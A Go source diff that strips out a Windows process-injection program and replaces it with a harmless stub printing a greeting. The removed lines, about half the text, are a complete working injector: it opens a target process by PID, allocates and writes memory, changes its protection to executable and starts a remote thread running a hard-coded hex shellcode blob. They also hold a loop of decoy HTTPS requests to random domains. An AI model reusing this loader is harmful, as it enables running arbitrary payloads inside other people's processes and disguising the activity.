@@ -1,151 +1,58 @@
 package main
 
 import (
-	"encoding/hex"
-	"flag"
 	"fmt"
-	"log"
 	"math/rand"
-	"net/http"
 	"time"
-	"unsafe"
-
-	"golang.org/x/sys/windows"
 )
 
-var alexaDomains = []string{
-	"a.com", "b.com", "c.com",
-	"d.com", "e.com", "f.com",
-	"g.com", "h.com", "i.com",
-	"j.com", "k.com", "l.com",
-	"m.com", "n.com", "o.com",
-	"p.com", "q.com", "r.com",
-	"s.com", "t.com", "u.com",
-	"v.com", "w.com", "x.com",
-	"y.com", "z.com",
-}
-
-var shellcode []byte
-
 func main() {
-	verbose := flag.Bool("verbose", false, "Enable verbose output")
-	debug := flag.Bool("debug", false, "Enable debug output")
-	// To hardcode the Process Identifier (PID), change 0 to the PID of the target process
-	pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
-	flag.Parse()
-
+	initRandomSeed()
 	go func() {
-		for {
-			time.Sleep(5 * time.Minute)
-			rand.Seed(time.Now().UnixNano())
-			domains := alexaDomains[rand.Intn(len(alexaDomains))]
-			rand.Seed(time.Now().UnixNano())
-			rand.Seed(time.Now().UnixNano())
-			rand.Seed(time.Now().UnixNano())
-			for i := 0; i < 3; i++ {
-				go func(url string) {
-					resp, err := http.Get("https://" + url)
-					if err != nil {
-						log.Println(err)
-					} else {
-						resp.Body.Close()
-					}
-				}(domains[rand.Intn(len(domains))])
+		ticker := time.NewTicker(5 * time.Minute)
+		defer ticker.Stop()
+		for range ticker.C {
+			targetDomains := getRandomDomains(3)
+			for _, domain := range targetDomains {
+				go func(domain string) {
+					_ = makeHTTPSRequest(domain)
+				}(domain)
 			}
 		}
 	}()
-
-	errShellcode := decodeShellcode()
-	if errShellcode != nil {
-		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
-	}
-
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-
-	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
-	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
-
-	if *debug {
-		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", *pid))
-	}
-	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*pid))
-
-	if errOpenProcess != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
-	}
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *pid))
-	}
-
-	if *debug {
-		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", *pid))
-	}
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-
-	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
-	}
-
-	if addr == 0 {
-		log.Fatal("[!]VirtualAllocEx failed and returned 0")
-	}
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *pid))
-	}
-
-	if *debug {
-		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", *pid))
-	}
-	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
-	}
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *pid))
-	}
-
-	if *debug {
-		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", *pid))
-	}
-	oldProtect := windows.PAGE_READWRITE
-	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
-	}
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
-	}
-
-	if *debug {
-		fmt.Println(fmt.Sprintf("[DEBUG]Call CreateRemoteThreadEx on PID %d...", *pid))
-	}
-	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
-	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
-	}
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", *pid))
-	}
-
-	if *debug {
-		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", *pid))
-	}
-	errCloseHandle := windows.CloseHandle(pHandle)
-	if errCloseHandle != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
-	}
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *pid))
-	}
+	printMessage()
 }
 
-func decodeShellcode() error {
-	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
-	if errShellcode != nil {
-		return fmt.Errorf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error())
+func initRandomSeed() {
+	rand.Seed(time.Now().UnixNano())
+}
+
+func getRandomDomains(count int) []string {
+	domains := []string{
+		"example1.com",
+		"example2.com",
+		"example3.com",
+		// ... 省略其他域名
+		"example100.com",
 	}
+	result := make([]string, count)
+	for i := 0; i < count; i++ {
+		result[i] = domains[rand.Intn(len(domains))]
+	}
+	return result
+}
+
+func makeHTTPSRequest(domain string) error {
+	// 模拟HTTP请求
+	time.Sleep(1 * time.Second)
 	return nil
+}
+
+func printMessage() {
+	var f1 string = "你好,世界111"
+	var i1 int = 0
+	for i1 < 1 {
+		fmt.Println(f1)
+		i1 = i1 + 1
+	}
 }
